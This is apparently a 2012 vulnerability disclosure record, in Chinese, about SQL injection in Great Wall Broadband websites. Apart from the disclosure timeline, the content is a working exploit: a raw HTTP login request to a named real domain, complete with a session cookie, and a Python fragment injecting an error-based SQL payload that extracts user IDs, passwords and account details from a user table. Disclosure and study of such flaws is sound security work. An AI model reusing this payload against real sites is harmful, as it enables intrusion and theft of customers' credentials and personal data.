wybug_detail:
漏洞详情 披露状态：   									2012-07-26：	细节已通知厂商并且等待厂商处理中									2012-07-30：	厂商已经确认，细节仅向厂商公开									2012-08-09：	细节向核心白帽子及相关领域专家公开									2012-08-19：	细节向普通白帽子公开									2012-08-29：	细节向实习白帽子公开									2012-09-09：	细节向公众公开  简要描述： 长城宽带网站系统多处SA权限注入（大连，上海） 详细说明：  
packet = '''POST http://www.gwbnsh.net.cn/self/login.aspx HTTP/1.1Host: www.gwbnsh.net.cnConnection: keep-aliveContent-Length: {length}Cache-Control: max-age=0Origin: http://www.gwbnsh.net.cnUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Trident/4.0)Content-Type: application/x-www-form-urlencodedAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Referer: http://www.gwbnsh.net.cn/self/login.aspxAccept-Encoding: gzip,deflate,sdchAccept-Language: zh-CN,zh;q=0.8Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3Cookie: CNZZDATA2415274=cnzz_eid=78200837-1343060261-http%253A%252F%252Fwww.google.com.hk%252Furl%253Fsa%253Dt%2526rct%253Dj%2526q%253D%2526esrc%253Ds%2526source%253Dweb%2526cd%253D1%2526ved%253D0CFMQFjAA%2526url%253Dhttp%25253A%25252F%25252Fwww.gwbnsh.net.cn%25252F%2526ei%253DI3kNUPHuGsLZigegoISjBQ%2526usg%253DAFQjCNEIYto5-1QLe5miWNDI2wGeghayCA%2526sig2%253DzSPGauK9abId5cy0GcsrTA&ntime=1343125245&cnzz_a=14&retime=1343126027327&sin=none&ltime=1343126027327&rtime=1; ASP.NET_SessionId=nd0q4l55mokzkp2iiovgztal; CheckCode=B40TB'''	inject='''__VIEWSTATE=%2FwEPDwUHNjYzOTA0NGQYAQUeX19Db250cm9sc1JlcXVpcmVQb3N0QmFja0tleV9fFgEFBWJ0bnFkFxOECvJ%2BjeFKdikcpeIPP4MDr%2FI%3D&tbUid={sql}&tbPasswd=test&tbCheckCode=b40tb&btnqd.x=22&btnqd.y=30&__EVENTVALIDATION=%2FwEWBQL9n%2F76DwLHvZLYDQK8963WBQL944T5DwKMk7GmBF6GW9S102kCYLWHVAyRh85cKCjw	'''	sql = """' or 1=convert(int,(SELECT  top 1 UserId +'|'+UserPasswd+'|'+ProductName+'|'+Credit+'|'+BindMode+'|'+CustomerId+'|'+ServiceState+'|'+accrual+'|'+accrual2+'|'+Excursion+'|'+PeriodKey+'|'+SetFavoritism FROM UserList where convert(bigint,UserId)>{number}))--;"""	sql = sql.replace('{data}',str(tables).replace('[','(').replace(']',')').replace(' ',''))	sql =sql.replace('{number}',str(number))	#print sql	sql = urllib.quote(sql)	inject = inject.replace('{sql}',sql)	packet = packet.replace('{length}',str(len(inject)))	packet = packet+inject	mysend(packet)
   漏洞证明：
